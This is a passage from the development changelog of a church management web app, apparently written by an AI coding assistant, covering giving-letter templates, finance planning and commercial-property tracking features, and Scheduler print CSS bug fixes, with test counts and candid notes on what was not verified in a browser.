- **Next**: Church Report visual restyle (keep all sub-views), Property tab restyle, Planning/Compensation split (Compensation to reuse the real LCMS/Concordia calculators as-is, plus a new manual "Concordia Decision Support estimate" reference block per worker — the user provided a real Concordia Compensation Decision Support Tool PDF for Rev. Dinger with 4 real ranges, confirming the $103,609 LCMS midpoint FIN15 already used narratively).
(`src/api-finance.js`, `src/db.js`, `migrations/0025_finance_property_budget.sql`, `src/frontend/html-head.js`, `src/frontend/html-tabs.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-overview.test.js`, `test/finance-property.test.js`)

### 2026-07-22 (v1.53.0 — Live WYSIWYG preview for both giving-letter templates)
Follow-up on the mid-year letter feature above: the Settings letter-template textareas only ever showed the raw `{{placeholder}}`/`\n` template text, which the user found hard to judge — asked for a way to preview the rendered letter, or a true WYSIWYG editor.
- Went with a **Preview modal** rather than a full WYSIWYG editor: much lower risk (the templates are still stored as the same plain-text mini-templating format `renderLetterHTML` already parses — no new storage format, no risk of a rich-text editor mangling the `{{...}}`/`{{#if_x}}` tokens on save) and reuses the exact rendering function real letters go through, so what's previewed is guaranteed to match what actually gets sent.
- `renderLetterHTML(d, letterType, cfgOverride)` (`src/frontend/js-reports.js`) gained an optional third param — preview needs to render the *unsaved* textarea contents without touching `_churchConfig` (which would leak a half-edited draft into every other in-session letter render until the next page load).
- New `renderLetterPreview(letterType)` (`src/frontend/js-settings.js`) builds a fixed 3-gift sample dataset ("Jane Sample", $600 across General/Building funds) and calls `renderLetterHTML` with a cloned config carrying the textarea's live value, so both the year-end and mid-year templates preview realistically without needing a real person's giving data. New "👁 Preview" button opens `#letter-preview-modal` (new modal, `html-tabs.js`) showing the rendered letter.
- **Live-updates while typing**: each textarea's `oninput` calls `liveUpdateLetterPreview(letterType)`, which re-renders only if the preview modal is both open AND currently showing that same letter type (tracked via a `data-preview-type` attribute set when the modal opens) — cheap no-op guard so typing in the *other* template's textarea, or with the modal closed, does no extra work.
- `npm test` (185/185), `node --check` on both built `<script>` blocks, and confirmed via the built `CHMS_HTML` output that the new modal markup and `previewLetterTemplate`/`liveUpdateLetterPreview`/`renderLetterPreview` functions are all present in the served page. **Not verified in a live browser.**
(`src/frontend/js-core.js`, `src/frontend/js-reports.js`, `src/frontend/js-settings.js`, `src/frontend/html-tabs.js`)

### 2026-07-22 (v1.52.0 — Mid-Year Giving Update letter, and clearer From-Email labeling)
Two requests in the same conversation: (1) a Resend "domain not verified" error when emailing giving statements, and (2) a new mid-year giving letter — thanks givers for what they've given so far this year, asks them to double-check the figures for accuracy, and suggests ways to set up recurring/automated giving.
- **Root cause of the Resend error**: not a code bug. Only `notify.timothystl.org` is verified in the church's Resend account — `timothystl.org` itself is not — and Settings' "From Email" (`church_from_email`, used by `POST /admin/api/giving/send-statement` in `src/api-import.js`) was set to an address on the unverified bare domain. Fixed by the user changing it to an address on `notify.timothystl.org` (matching the domain `EMAIL_FROM` already uses for birthday/anniversary emails). No code change needed for the fix itself, but the Settings label was genuinely confusing — it read like generic contact info, not "the address that actually sends mail, and it must be on a Resend-verified domain." Relabeled to "Sending Name"/"Sending Email Address (must be on a domain verified in Resend)" with a caption linking to resend.com/domains and clarifying it's not a reply-to/contact address. (`src/frontend/html-tabs.js`)
- **New Mid-Year Giving Update letter**: new `DEFAULT_MIDYEAR_LETTER_TEMPLATE` (`src/frontend/js-core.js`) — thankful tone, shows the giver's year-to-date gift table + total, asks them to flag anything that looks wrong, and lists ways to automate giving (online recurring giving via a new optional `{{giving_url}}` placeholder, bank draft/bill pay, or contacting the office). Separate, editable template from the existing year-end tax-statement letter (new `giving_midyear_letter_template` config key) since the tone/legal content genuinely differ — the mid-year version has no EIN/tax-deduction language.
- `renderLetterHTML(d, letterType)` (`src/frontend/js-reports.js`) now takes a `letterType` ('year_end' default | 'midyear') and picks the matching template + adds a `{{giving_url}}`/`{{#if_giving_url}}` substitution (empty string omits the whole conditional line, same pattern as the existing `{{#if_ein}}`). `showGivingLetter`/`emailGivingLetter`/`runGivingStatementLetter` thread the same param through; mid-year emails get their own subject line ("`<year>` Mid-Year Giving Update").
- New "Mid-Year Update Letter" buttons alongside the existing "View Letter" button in both the person and household Giving Statement report views, plus a new "Batch Send Mid-Year Update" report tile (`src/frontend/js-export-import.js`: `loadBatchMidyearGivers`/`selectAllMidyearGivers`/`sendBatchMidyearLetters`/`doSendMidyearBatch`, deliberately parallel/duplicated rather than parameterizing the existing year-end batch-send functions, matching this file's own precedent (HG1/HG4) of leaving small duplication alone when extracting it would just add indirection) so an admin can send the whole year's givers a mid-year thank-you/reminder in one pass, same UX as the existing year-end batch send.
- New `online_giving_url` config field (Settings → Church Information) — optional; if blank, the mid-year letter's online-giving line is omitted entirely rather than showing a broken/empty link. Both new config keys (`giving_midyear_letter_template`, `online_giving_url`) added to the `config/church` GET/PUT allowlists (`src/api-import.js`).
- `npm test` (185/185), `node --check` on both built `<script>` blocks (`app-core.js`/`app-ext.js` extracted from `CHMS_HTML`), plus a standalone Node harness exercising `renderLetterHTML`'s new conditional-block logic with and without `online_giving_url` set. **Not verified in a live browser** — no live Resend/browser access in this environment; the sending flow itself (`giving/send-statement`) is unchanged, only the template/subject/config plumbing feeding into it.
(`src/frontend/js-core.js`, `src/frontend/js-reports.js`, `src/frontend/js-export-import.js`, `src/frontend/js-settings.js`, `src/frontend/html-tabs.js`, `src/api-import.js`)

### 2026-07-20 (v1.45.0 — Church chart-of-accounts reorganization: Revenue-first, Earned/Restricted Income groupings, Net row)
User asked for the Church Report/Planning account tree to be reorganized for presentation: Revenue (renamed from "Income") listed before Expenses; Facility Rental/Fundraisers/MDO grouped under a new "Earned Income" heading; Altar Guild grouped under a new "Restricted Income" heading; "Sales" removed from the detail view; and a Net (plus/minus) row added to the Planning table so it's obvious whether a year is projected to run positive or negative.
- New `finReorganizeChurchTree()` (pure, DOM-free, unit-tested via the extract-and-eval technique — `test/finance-church-tree.test.js`) — a **display-only** transform: clones the tree `finBuildTreeFromFlatRows()` already builds, removes any "Sales" node, re-parents Facility Rental/Fundraisers/MDO under a new synthetic "Earned Income" node and Altar Guild under a new "Restricted Income" node, relabels the Income root "Revenue", then recomputes every node's rolled-up total bottom-up from scratch (`finRecomputeTreeTotals`) — critical, since a node's total is a point-in-time sum baked in at build time and does NOT auto-update when children are moved elsewhere; patching it incrementally would have silently left stale totals on whichever old parent lost a child. Sorts top-level sections Income → Cost of Goods Sold → Expenses → Other Income → Other Expenses.
- Applied everywhere the real account tree is rendered: Church Report's This Year detail table, its Revenue/Expense pie charts, its CSV export, and the Planning table — all four now show the same reorganized structure, since they all call the same function on the same underlying tree rather than duplicating the tree-building logic.
- Also relabeled "Income" → "Revenue" in every other Church Report display string that isn't the tree itself: stat card titles, the This-Year-vs-Last-Year chart/table, the 5-year Multi-Year table + chart, and CSV export headers. The underlying `classification` value stored in the database (and used internally for `resolveChurchYearPrecedence`/`computeYearSummary`/matching) is unchanged — this is a label swap in the UI layer only.
- **Known limitation, flagged rather than silently accepted**: the Church Report's own "Total Revenue" stat card is still computed server-side from ALL rows including Sales (`computeYearSummary`, unchanged) — hiding Sales from the detail tree does NOT remove its dollars from that top-line total. If Sales should be excluded from the real total too (not just hidden from the account list), say so and this can be extended to filter it out server-side.
- **Planning: Net row added** — a bolded "Net (Revenue − Expenses)" row under the account table showing FY{base} Budget/Actual (straight from the server's own `computeYearSummary` — exact match to Church Report, not re-derived) and FY{target} Projected (summed client-side from every *leaf* account's planned value, split Revenue vs. Expense by classification — deliberately leaf-only so a value typed directly onto a group/branch row, which the table still allows, doesn't double-count into the total). Colored red when negative, green when positive.
- `npm test` (148/148 — 5 new tests for `finReorganizeChurchTree`: relabel+sort, Earned Income grouping with correct rolled-up totals, Restricted Income grouping, Sales removal with correct ancestor-total recomputation, and a non-mutation check on the input tree).
- `node --check` on both built `<script>` blocks. **Not verified in a live browser.**
(`src/frontend/js-finance.js`, `test/finance-church-tree.test.js`)

### 2026-07-20 (v1.44.0 — Church Budget Planning rebuilt around the real chart of accounts)
User feedback on the freshly-shipped FIN12 Planning tool: it should pull directly from the current budget's real account lines (not freeform typed category names), show 3 columns (Current Year Budget / Current Year Actual / Projected Next Year), be organized hierarchically like a real financial statement (not a flat list), and needs a distinct Salary & Benefits subsection (a formula + a Concordia Plan Services rate comparison to come later).
- **Real accounts, not freeform text**: the Planning table now renders `finBuildTreeFromFlatRows()` — the exact same tree Church Report's This Year view already builds from `finance_church_entries` — reused as-is rather than reimplemented, so Planning is automatically organized identically to the real budget (Income/Expenses sections, indented sub-accounts) instead of a flat pick-list. `category` in `finance_budget_plan` is now always a real `category_path` (e.g. `Expenses:Salaries & Benefits`) rather than hand-typed text — no schema change needed, since that column was already freeform text.
- **3 columns as requested**: FY{base} Budget | FY{base} Actual | FY{target} Projected, with a Base Year and Projecting-For-Year picker at the top (defaults to current year → next year).
- New `POST /admin/api/finance/planning/church/generate-all` bulk-generates a projected line for **every** real account in the base year in one call (base = that account's actual, falling back to budget if no actual yet; accounts with neither are skipped — nothing real to grow from), rather than requiring one `generate` call per category by hand.
- New `POST /admin/api/finance/planning/church/override-bulk` lets the whole table be hand-edited (any Projected cell is a live input) and saved in a single round trip, replacing the old one-category-at-a-time override form.
- **Salary & Benefits**: shows up like any other account line in the table for now (per the user, a formula and a Concordia Plan Services comparison tool are coming later) — added a clearly-labeled callout section explaining that rather than guessing at a formula that wasn't provided yet.
- `npm test` (143/143 — 4 new tests: generate-all's actual-falls-back-to-budget base selection and its skip-if-neither-exists behavior, override-bulk's all-or-nothing batch save).
- `node --check` on both built `<script>` blocks and `src/api-finance.js`. **Not verified in a live browser.**
(`src/api-finance.js`, `src/frontend/js-finance.js`, `test/finance-budget-plan.test.js`)

### 2026-07-20 (v1.43.0 — Church Budget Planning + 3277 Ivanhoe Multi-Year Forecast)
New "Planning" sub-tab in Finance, closing out the last piece of this session's batch of requests. Clarified scope with the user first (two quick questions) rather than guess: (1) the planner needed to be BOTH a what-if forward projection tool AND able to commit its output as a real future year's budget entry; (2) "property expenses" planning and 3277 Ivanhoe's own forecasting needed to stay separate sections, not merged — they're genuinely different mechanics (a manually-planned church operating budget vs. an actuals-only rental property with no internal "budget" concept to plan against).
- **Church Budget Planning**: new `finance_budget_plan` table (migration `0024`, `category` + `fiscal_year` keyed, freeform category names — not tied to any specific QuickBooks account, so "Property Expenses"/"Salaries & Benefits"/"Utilities"/"Insurance" or anything else can be planned without needing a matching QBO account to already exist). New endpoints: `generate` (compounds a growth rate forward from a starting dollar amount across a run of target years, `basis='grown'`), `override` (a single year's manual correction, `basis='manual'`, doesn't disturb sibling years), `DELETE` one category/year, and `commit` (writes every planned category for one fiscal year into `finance_church_entries` as a placeholder budget, `source='plan_committed'`, wholesale-replacing any prior commit for that year so re-committing after an edit doesn't leave stale categories).
- **`resolveChurchYearPrecedence()` redesigned** from a 2-way (`import` beats `qbo_sync`) check into an explicit 3-tier priority list (`import` > `qbo_sync` > `plan_committed`), so a committed plan is truly just a placeholder — the moment a real sync or import exists for that year, the plan gets out of the way automatically rather than needing to be manually deleted. Verified backward-compatible against the existing 2-source test suite, plus 3 new tests for the plan_committed tier.
- **3277 Ivanhoe Multi-Year Forecast**: extends the single-year Cash Flow & Payoff Forecast already on the Commercial Property tab into an adjustable-growth-rate, adjustable-year-count projection table, entirely client-side (no new backend route — reuses data the property GET call already returns). Deliberately kept as a separate, read-only, no-commit section from Church Budget Planning, since the property has no budget to commit into.
- `npm test` (139/139 — 7 new tests for the planning CRUD endpoints, 3 new tests for the resolveChurchYearPrecedence priority tiers). `node --check` on both built `<script>` blocks and `src/db.js`/`src/api-finance.js`. **Not verified in a live browser.**
(`migrations/0024_finance_budget_plan.sql`, `src/db.js`, `src/api-finance.js`, `src/frontend/js-core.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `test/finance-budget-plan.test.js`, `test/finance-church.test.js`)

### 2026-07-20 (v1.42.1 — Valuation Calculator rebuilt from the real AHRA worksheet)
Immediately after v1.42.0 shipped a simplified valuation calculator (one lump gross-income input, one lump operating-costs input), the user uploaded the actual AHRA valuation worksheet (`3277_Ivanhoe_Valuation_2.xlsx`) they'd asked about earlier in the session — turns out it exists and is far more detailed than the flat data export: a real per-tenant rent roll (Apartment 1/2, RJBJ - Crossfit, Magnatone — SF, annual rent) and itemized operating costs (Utilities/Trash/Maintenance/Landscaping/Legal/Taxes/Insurance/Management Fee %), which reconcile exactly to the summary figures already in the app.
- Rebuilt `finRenderValuationCalculator()` to match the real worksheet: an editable Rent Roll table (add/remove tenant rows — tenant name, SF, annual rent), itemized Operating Cost inputs, Vacancy Rate %, Management Fee %, and Cap Rate, all live-recomputing Gross Rental Income → Effective Rental Income → Total Operating Costs → NOI → Capitalized Value as you type.
- New pure `finComputePropertyValuation()` function (no DOM) backs both the live recompute and the final Save, so the displayed numbers and the saved numbers can never disagree — unit-tested against the real worksheet figures (`test/finance-property-forecast.test.js`), including a closed-form reconciliation check (Gross Rental Income $119,055.85, Total Operating Costs $64,150.66, NOI $54,905.19, Capitalized Value $686,314.86 within a few cents of rounding drift), plus vacancy-rate and cap-rate sensitivity checks.
- Seed data updated: `FINANCE_PROPERTY_IVANHOE_META.valuation` now carries the real rent roll + itemized costs instead of the earlier lump totals; a new marker-gated `seedIvanhoePropertyValuationV3()` applies this to already-seeded databases (separate marker from the v1.41.0 reserves upgrade, since it can land independently).
- Still saves via the existing `finance/property/ivanhoe/meta` PATCH route — no new backend endpoint needed.
- `npm test` (128/128 — added 4 tests for `finComputePropertyValuation`). `node --check` on both built `<script>` blocks. **Not verified in a live browser.**
(`src/db.js`, `src/frontend/js-finance.js`, `test/finance-property-forecast.test.js`)

### 2026-07-20 (v1.42.0 — Daycare MDO note + past-year bulk import; Commercial Property reports, forecast, valuation calculator)
Follow-up to v1.41.0's reserves/capital/repairs work, addressing a batch of requests in one message: move the MDO utility-cost-share data into the Daycare Report (it was stored but not shown anywhere after v1.41.0, by design — it's about the church building, not 3277 Ivanhoe); a way to bulk-enter past daycare years instead of one row at a time; and, for Commercial Property, "reports that are useful — graphs, charts, planning tools, forecasting… potential revenue… when it is paid off." Also answered: no, the raw AHRA valuation worksheet itself was never uploaded (only the rebuilt analysis workbook with the same numbers baked in) — built an in-app editable calculator instead so staff can update it without needing that spreadsheet.
- **Daycare — MDO utility note**: new `fin-daycare-mdo-note` container above the Daycare Report table, rendered from `_finProperty.meta.church_building_shared_costs` (the property GET call was already fetching this; it just wasn't displayed anywhere). Populated once the Commercial Property data loads (`finLoadProperty()`'s success callback now also calls `finRenderDaycareMdoNote()`), since Daycare Report renders synchronously before that async call resolves.
- **Daycare — bulk past-year import**: new `POST /admin/api/finance/daycare/bulk` endpoint (`{rows: [...]}`, all-or-nothing — validates every row before writing any, matching this app's giving-import convention of failing loud rather than partially importing). New "Bulk-Enter Past Years" textarea on the Daycare Sync card: paste `period, category, type, amount, notes` one per line, Preview parses and table-renders it, then a single Import button commits all rows in one round-trip.
- **Commercial Property — charts**: `renderGroupedBarChart()` (the same helper already backing Attendance/Church Report charts) now also renders a Monthly Revenue-vs-Expenses chart, an Occupancy % chart, and a Property Tax Reserve balance-over-time chart (last 24 months each). Net Income was deliberately left out of the bar chart — `renderGroupedBarChart` doesn't render negative bars visibly, and several months are negative — it stays in the existing Monthly Financials table, which always shows the real signed number.
- **Commercial Property — Cash Flow & Mortgage Payoff Forecast**: new `finComputeMortgageAmortization()` (pure function, unit-tested via the extract-and-eval technique against the actual built script — see `test/finance-property-forecast.test.js`) amortizes the loan forward from its current balance/rate/payment to a projected payoff date and remaining interest. "Potential Annual Net Income After Payoff" = trailing-12-month average net income + the current annual debt service, with an explicit on-screen caveat that this assumes the mortgage payment is already being subtracted from AHRA's reported Net Income — that assumption wasn't independently confirmed against AHRA's bookkeeping, so it's presented as a planning estimate, not a guarantee.
- **Commercial Property — Valuation Calculator**: editable income-capitalization inputs (gross rental income, total operating costs incl. management fee, cap rate) live-computing NOI and capitalized value client-side, with a Save button that PATCHes the existing `finance/property/ivanhoe/meta` endpoint (no new backend route needed — that endpoint already merges into the `valuation` section). Lets staff update the valuation themselves going forward without AHRA's spreadsheet.
- `npm test` (124/124 — added 4 tests for the amortization math including a closed-form cross-check, plus 2 for the daycare bulk-import all-or-nothing behavior). `node --check` on both built `<script>` blocks and `src/api-finance.js`. **Not verified in a live browser.**
(`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`, `test/finance-property.test.js`, `test/finance-property-forecast.test.js`)

### 2026-07-20 (v1.41.0 — Commercial Property: reserves, capital improvements, repairs, insurance allocation)
Follow-up to v1.40.0, closing the gap the user flagged right after that shipped: "it doesn't have the places for reserves for property taxes, and capital expenses, and those things." User's coworker (via Cowork) pulled the real source documents (Gmail Takeout export of a "Commercial Property" label → .mbox → parsed with Python's `mailbox` module) and delivered a v2 structured export with the actual AHRA general ledger detail behind the reserve/capital accounts, plus an updated mortgage balance. Also corrected an insurance-allocation bug from the coworker's own earlier pass (only counted the "Apartments" TIV bucket for 3277 Ivanhoe, undercounting it — the "Lessors Risk Gym" bucket is also 3277 Ivanhoe, confirmed by an exact dollar match and by Andrew).
- **Updated loan/equity figures**: mortgage balance $297,336 (as of 2025-11-20) → $279,691.13 (as of 2026-07-20, 6.375% interest, normal paydown), recomputing equity to $406,623.73 (40.75% LTV, mixing the newer loan balance with the still-2025-11-20 valuation — noted in the UI). `loan.balance_history` added to the meta blob so the paydown trail isn't lost. Applied via a one-time marker-gated upgrade (`seedIvanhoePropertyReservesV2()` in `src/db.js`, gated on a `chms_config` marker rather than a row-count check like the original seed, since this is a delta against a DB that may already have the v1 data) rather than reseeding — a fresh install gets the corrected figures directly.
- **Property Tax Reserve** — new generic `finance_property_reserves` table (keyed by `property_key` + `reserve_key` + `report_month`, so the same mechanism could later track other named reserve buckets) holds AHRA's real month-by-month schedule (28 months, Dec 2023–May 2026): estimated tax, reserve before/contribution/after, with the reserve zeroing out each November when the actual bill is paid. New `finance_property_reserve_disbursements` table holds the 3 confirmed tax-bill payments (2023/2024/2025) plus the not-yet-paid 2026 note. New `POST/DELETE /admin/api/finance/property/ivanhoe/reserves/:reserveKey/monthly` and `.../disbursements` routes — the monthly endpoint auto-computes `reserve_before` from the prior month's `reserve_after` (matching how AHRA's own schedule carries the balance forward) unless one is explicitly supplied. UI: a schedule table + a paid-by-year table + an admin add-form, with the separate (currently unfunded, $0/$0) "Paint, Asphalt and Concrete" capital reserve surfaced as a note rather than a fabricated empty schedule.
- **Capital Improvements** — new `finance_property_capital_ledger` table holds the real 7-entry ledger (Vail Contracting, SS Stone & Design, Martin Jetco Heating & Air, check/invoice references) totaling $33,947.75, tagged with a `project` field for display grouping. The 4-project rollup (apartment renovation, HVAC replacement, washer/dryer hookup, and Tuckpointing — which was expensed, not capitalized, a $0-ledger judgment call AHRA made) is hand-curated in the meta blob rather than derived, since the zero-ledger-row project can't be computed from the ledger alone. New `POST/DELETE /admin/api/finance/property/ivanhoe/capital-ledger[/:id]` routes; admin add-form on the UI card.
- **Repairs & Maintenance** — new `finance_property_repairs` table holds the 13 non-capitalized repair line items (roof leaks, HVAC repairs, appliance replacement, tuckpointing) with `capitalized=0`; several real entries have a null dollar amount (not fabricated) since AHRA's monthly narrative didn't always break one out. New `POST/DELETE /admin/api/finance/property/ivanhoe/repairs[/:id]` routes; admin add-form.
- **Insurance Allocation** — a read-only reference card: 3277 Ivanhoe's TIV share (30.75%) of the church's single GuideOne Commercial Package Policy, allocated annual premium (~$15,263), with the coworker's corrected two-bucket ("Apartments" + "Lessors Risk Gym") allocation logic and the note explaining why. Stored as a JSON blob in the existing meta key (`property`/`valuation`/`loan`/`capital_improvements`/`insurance`/`church_building_shared_costs` sections) rather than a new table, since it's a once-or-twice-a-year reference figure, not a recurring series.
- **`church_building_shared_costs`** (the MDO utility-cost estimate at the church's own 6704 Fyler building) is stored in the meta blob so the data isn't lost, but **deliberately not surfaced in the Commercial Property UI** — the export itself flags this as a different building/fund than 3277 Ivanhoe. Needs its own home (Daycare Report? Overview?) — flagged to the user as a follow-up, not guessed at.
- `npm test` (118/118 — added 15 new tests: reserve auto-carry-forward across months, a zero-contribution "paid" month + a separately-recorded disbursement, reserve/disbursement/ledger/repair delete, capital-ledger sort_order + totaling, and admin-only write guards). `node --check` on both built `<script>` blocks (`CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS`) and on `src/db.js`/`src/api-finance.js`. **Not verified in a live browser.**
(`migrations/0023_finance_property_reserves.sql`, `src/db.js`, `src/api-finance.js`, `src/frontend/js-finance.js`, `test/finance-property.test.js`)

### 2026-07-20 (v1.40.0 — Finance tab: new "Commercial Property" section for 3277 Ivanhoe)
User's coworker delivered a structured data export (JSON + 2 CSVs) of 3277 Ivanhoe — a commercial rental property owned by the church, managed by AHRA — covering 28 months of financials (Dec 2023–May 2026, with a known Jan/Feb 2024 gap), an annual rollup, an income-capitalization valuation ($686,315 as of 2025-11-20), the LCEF loan balance ($297,336, user-confirmed 2026-07-20 over a conflicting $92,322.68 MRI-migration artifact), and 3 years of confirmed distributions to the church ($34K/2024, $8K/2025, $4K/2026 YTD). Built as a new "Commercial Property" sub-tab in the Finance tab, alongside Overview/Church Report/Daycare Report, following the export's own scope note that this should be flat/simple presentation rather than a GAAP-formal ledger.
- New tables `finance_property_monthly` and `finance_property_distributions` (migration `0022_finance_property.sql`), keyed by `property_key` (`'ivanhoe'` today) so a second property could be added later without a schema change. Seeded once, idempotently, from the delivered export (`seedIvanhoeProperty()` in `src/db.js`, same `INSERT OR IGNORE`-guarded pattern as the Tuition Aid history seeds) — dollar figures converted to integer cents at seed time per this app's Data Integrity convention. Static valuation/loan/property-info figures live in `chms_config` as a JSON blob (`finance_property_ivanhoe_meta`), reusing the existing generic key/value table rather than adding a second singleton-config table.
- New `GET/POST/DELETE /admin/api/finance/property/ivanhoe/*` routes in `src/api-finance.js` (`handlePropertyApi`, dispatched from `handleFinanceApi`, already gated behind `isFinance` for reads; writes additionally require `isAdmin`): fetch everything for the section in one call, upsert/delete a month's financials, upsert/delete a distribution, and PATCH the meta blob's `property`/`valuation`/`loan` sections (a shallow merge, so updating just the loan balance doesn't clobber the lender name or property notes). Annual summary is computed server-side from the monthly rows + distributions (`computePropertyAnnualSummary`, exported and unit-tested) rather than stored as a separate duplicated table, so it can never drift from what's in the monthly table — the one exception is each year's hand-written board note, which isn't derivable and is kept in the meta blob.
- New sub-nav item + panel in the Finance tab (`FIN_TOPNAV_ITEMS` in `js-core.js`, `fin-panel-property` in `html-tabs.js`): valuation/mortgage/equity/LTV stat tiles, property info + the mortgage-balance-artifact note + known-data-gaps note, an Annual Summary table, an editable Monthly Financials table (admin-only Edit/Delete via a new `fin-property-month-modal`, "+ Add Month" for future AHRA reports), and a Distributions-to-Church list with an admin-only add form.
- `npm test` (111/111 — added `test/finance-property.test.js`, 8 new tests covering the annual-summary aggregation's null-handling and year-grouping, the cents conversion on write, the admin-only write guard, malformed-period rejection, distribution upsert/delete, and the meta PATCH's shallow-merge behavior), `node --check` on both built `<script>` blocks (`CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS`) and on `src/db.js`/`src/api-finance.js`. **Not verified in a live browser** — same standing caveat as most other Finance tab work this project (see FIN2/FIN6 entries above).
(`migrations/0022_finance_property.sql`, `src/db.js`, `src/api-finance.js`, `src/frontend/js-core.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `test/finance-property.test.js`)

### 2026-07-20 (v1.39.3 — People tab: double-click a row/card to open the full profile)
User asked for a double-click shortcut to the full Person Profile from the People tab's List/Card views, which currently open the RDS2 quick-view side panel on a single click (with a "Full Profile" button inside the panel to go further). Added `ondblclick="openPersonDetail(p.id)"` alongside the existing single-click `openPersonQuickView`/`togglePersonSelect` handler on both the List view's `<tr>` and the Card view's `.ppl-card` div — the browser fires both the two `click` events and one `dblclick` event on a real double-click, so this just adds a second, faster path to the same destination without changing single-click behavior. Household view (its own card grid, reused from the Households tab) and the mobile contact-card list (already single-tap-to-profile, correct for touch) were left unchanged. `npm test` (103/103), `node --check` on both built `<script>` blocks. Not verified in a live browser. (`src/frontend/js-people.js`)

### 2026-07-20 (v1.39.2 — Bug fix: v1.39.1's print fix had a CSS-specificity regression)
User reported print still just showed "Loading" after v1.39.1 deployed — that fix was incomplete, introduced by this session, not a separate new bug. Root cause: v1.39.1 changed the People/Settings-tab print-hide rule from a plain `#id` selector to an `[id$="..."]` attribute selector (needed so it still matches once `scheduler-inline.js` renames those ids for the embedded context — see v1.39.1's entry). What wasn't accounted for: an `#id` selector has *higher* CSS specificity than a class, but `[attr=...]` only has *class-level* specificity, the same as the `.tab-content{display:block!important}` rule sitting right after it. With equal specificity and both `!important`, the *later* rule in the stylesheet wins the cascade — so `.tab-content` (which comes after) silently overrode the hide rule, making the People & Availability and Settings sub-tabs print *visible* at the same time as the Schedule tab. Their content sitting on top of (or interleaved with) the real schedule is what looked like a stuck "Loading" page.
- Fixed by moving `[id$="tab-people"], [id$="tab-settings"] { display: none !important; }` to *after* the `.tab-content{display:block!important}` rule, so it now wins by source order with equal specificity — no selector rewrite needed, just reordering.
- **Verified this time in an actual real browser**, not just static reasoning — Playwright/Chromium is available in this environment and wasn't used for the two previous print attempts, which is exactly how a CSS cascade bug like this slipped through twice. Built a minimal repro combining the real embedded CSS output with the real element structure, emulated `print` media, and read `getComputedStyle().display` directly: confirmed the pre-fix ordering reproduces the bug (People/Settings panels wrongly `block`) and the fixed ordering resolves it (only the Schedule panel is `block`, everything else `none`) — checked against the actual `getSchedulerInline()` build output, not a hand-copied approximation.
- **Lesson for next time**: this environment has a real headless Chromium available via Playwright — for CSS cascade/specificity questions specifically (as opposed to JS logic, which the existing `node --check`-on-extracted-script technique already covers well), reach for an actual `emulateMedia()` + `getComputedStyle()` check instead of reasoning about specificity by hand, especially for `!important` vs `!important` conflicts where getting the tie-break rule wrong is an easy, hard-to-spot mistake.
- (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.39.2 — Settings/Import-Export cleanup: hid giving test-data panels, consolidated Breeze sync buttons)
User asked to remove the giving-related testing/reset panels from Settings → Import/Export (accumulated during earlier debugging sessions) and to collapse the scattered Breeze sync buttons into one section. Two changes, both UI-only — no backend/endpoint changes:
1. **Removed 3 giving test/reset panels from the UI**: "Prune Empty Batches", "Clear Giving Data for One Year", "Clear All Giving Data". Their backend endpoints (`/admin/api/giving/prune-empty-batches`, `/admin/api/giving/by-year` DELETE, `/admin/api/giving/all` DELETE) and frontend handler functions (`pruneEmptyBatches`, `clearGivingByYear`, `clearAllGiving`) are left intact but now unreachable from the UI — kept rather than deleted in case a real one-off data reset is ever needed again; re-add the buttons (or call the endpoints directly) if so.
2. **Consolidated Breeze sync UI**: the 3 separate top-level cards ("Sync People from Breeze", "Sync Giving from Breeze", "Map Breeze Funds to Real Fund Names") merged into one "Breeze Sync" card with People/Giving/Fund Names sub-sections (all existing element ids and onclick handlers unchanged, so no JS changes needed). "Import Giving from Breeze CSV Export" (a file upload, not a live Breeze API sync) stays as its own separate card. Other Breeze-adjacent tools (Find Duplicate Funds, Migrate Scheduler Volunteers, Cascade Household Photos, Normalize Phones) were left as-is — they aren't themselves Breeze API calls.
`npm test` (103/103), `node --check` on both built `<script>` blocks (`CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS`). Not verified in a live browser. (`src/frontend/html-tabs.js`)

### 2026-07-20 (v1.39.1 — Bug fix: Scheduler's Print button did nothing in the embedded tab)
User reported "Print" (More menu → Print) in the Scheduler just shows "Loading" — confirmed pre-existing, unrelated to today's SC6 phases (nothing in Phases 1–3 touches print CSS; `git log` on the relevant ChMS-level rule shows it predates this session by many commits). Two independent bugs, both real:
1. **ChMS's own print stylesheet (`html-head.js`)** hard-codes an allowlist of exactly two tabs that are allowed to render in `@media print` — `#tab-reports` and `#tab-finance` — every other `.tab-panel`, including `#tab-scheduler`, gets `display:none!important`. This was written before Scheduler had its own Print button and never extended to include it, so printing from the Scheduler tab printed essentially nothing. Fixed by adding `:not(#tab-scheduler)` to the exclusion list.
2. **Scheduler's own print CSS (`scheduler-html.js`)** — even with #1 fixed, its `@media print` rules reference the Scheduler's *internal* tab ids (`#tab-schedule`, `#tab-people`, `#tab-settings`, `#tab-stats`) directly. Those ids get a `sched-` prefix when embedded in the ChMS SPA (`scheduler-inline.js`, to avoid colliding with ChMS's own `#tab-people`) — so a literal `#tab-schedule` selector matched nothing in the actual embedded DOM; the rule was silently inert. Rather than adding a 25th fragile string-replace rule to `scheduler-inline.js`'s already-large transform pipeline (the exact class of risk flagged in the SC6 feature inventory), fixed by switching those 4 selectors to `[id$="tab-schedule"]`-style attribute-suffix selectors, which match both the unrenamed standalone id and the `sched-`-prefixed embedded id with zero transform-pipeline changes.
- Verified against the actual `getSchedulerInline()` output that the print rules are present and correctly scoped under `.sched-root` (e.g. `.sched-root [id$="tab-schedule"] { display: block !important; }`). `scheduler/index.html` resynced, `node --check` on both standalone and embedded builds, `npm test` (103/103, no backend touched). **Not verified**: an actual browser print/print-preview — this environment has none; worth confirming print actually produces the full schedule table once deployed.
- (`src/frontend/html-head.js`, `src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (SC6 Phase 3 — v1.39.0 — Scheduler People & Availability wired to real People)
Third slice of relationalizing Scheduler volunteers. This is the first phase that changes live Scheduler behavior — People & Availability now reads/writes the real `scheduler_volunteers` table for anyone linked to a real ChMS person, while anyone not yet migrated keeps working exactly as before (nothing forces a migration; Phase 2's tool is still how you convert someone).
